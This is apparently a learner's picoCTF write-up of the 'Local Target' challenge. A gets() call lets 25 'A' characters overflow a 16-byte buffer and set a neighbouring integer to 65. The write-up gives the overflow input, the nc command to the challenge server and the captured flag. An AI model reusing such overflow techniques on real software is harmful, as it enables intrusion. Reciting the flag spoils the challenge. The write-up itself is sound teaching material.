# Local Target

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Platform:** picoCTF

---

## Description

The goal of this challenge is to exploit a buffer overflow vulnerability to overwrite a local variable (`num`) and change its value from **64** to **65**. Once `num` becomes `65`, the program prints the flag.

---

## Source Code Analysis

The important part of the program is:

```c
char input[16];
int num = 64;

gets(input);

printf("num is %d\n", num);

if (num == 65) {
    printf("You win!\n");
    ...
}
```

### Vulnerability

The program uses:

```c
gets(input);
```

`gets()` does **not** check how many characters are entered.

Since `input` is only **16 bytes**, entering more than 16 characters writes past the end of the buffer and starts overwriting nearby variables stored on the stack.

The variable immediately after `input` is `num`, making it possible to modify its value.

---

## My Thought Process

At first, I did not know exactly how many characters were needed to overwrite `num`.

I started experimenting with different inputs and observed how the value of `num` changed.

Examples:

```
AAAAAAAAAAAAAAAA
num is 64
```

```
AAAAAAAAAAAAAAAAAAAAAAAA
num is 0
```

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
num is 1094795585
```

After seeing these results, I realized that once the input becomes long enough, it begins overwriting the integer stored after the buffer.

I continued adjusting the input length until I reached exactly the point where the first byte of `num` became `65`.

Finally, using **25 'A' characters** produced:

```
num is 65
You win!
```

---

## Solution

Connect to the remote service:

```bash
nc saturn.picoctf.net <PORT>
```

Enter:

```
AAAAAAAAAAAAAAAAAAAAAAAAA
```

(25 A's)

Output:

```
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

---

## Flag

```
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

---

## What I Learned

- How stack-based buffer overflows happen.
- Why `gets()` is considered an unsafe function.
- Local variables are stored next to each other on the stack.
- Writing beyond the end of a buffer can overwrite neighboring variables.
- The overwritten value depends on the exact number of bytes written.
- Small changes in input length can completely change the value of an integer.
- Trial and observation are useful when learning memory layouts.

---

## Commands Used

```bash
nc saturn.picoctf.net <PORT>
```

Example payload:

```text
AAAAAAAAAAAAAAAAAAAAAAAAA
```

---

## Key Takeaway

This was my first practical experience exploiting a **stack buffer overflow**. Instead of crashing the program, I used the overflow to modify another local variable (`num`) and satisfy the program's condition. This challenge showed me how dangerous unsafe functions like `gets()` are and how memory corruption can change program behavior.